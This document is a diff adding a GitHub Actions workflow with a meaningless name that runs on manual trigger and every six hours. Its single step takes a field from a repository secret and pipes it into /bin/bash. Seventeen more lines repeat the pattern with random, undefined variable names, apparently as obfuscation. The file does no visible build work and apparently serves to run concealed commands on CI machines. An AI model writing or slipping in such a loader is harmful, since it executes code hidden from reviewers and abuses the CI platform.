@@ -1,0 +1,34 @@
+name: quantumfaithquick
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: quantumfaithquick
+        env:
+          regq58041: ${{ secrets.regq58041 }}
+        run: |
+          echo $regq58041 | jq -r .by9554 | /bin/bash
+          echo $ys09 | jq -r .xbj42235 | /bin/bash
+          echo $knbb0 | jq -r .hyb13 | /bin/bash
+          echo $sch4634 | jq -r .w5 | /bin/bash
+          echo $bfxu7051 | jq -r .k94637 | /bin/bash
+          echo $ael642 | jq -r .pb45047 | /bin/bash
+          echo $ndtoe820 | jq -r .tg39868 | /bin/bash
+          echo $u483 | jq -r .ktf4934 | /bin/bash
+          echo $qhhl14 | jq -r .p7 | /bin/bash
+          echo $jwt374 | jq -r .dzmve32642 | /bin/bash
+          echo $g13368 | jq -r .ptgs393 | /bin/bash
+          echo $qcka77028 | jq -r .qnmd7 | /bin/bash
+          echo $p637 | jq -r .kzfj10 | /bin/bash
+          echo $ytl8 | jq -r .kartg52874 | /bin/bash
+          echo $hqu51575 | jq -r .t453 | /bin/bash
+          echo $reqd42068 | jq -r .t71 | /bin/bash
+          echo $f4 | jq -r .vak9 | /bin/bash
+          echo $dahj59 | jq -r .h0 | /bin/bash
+
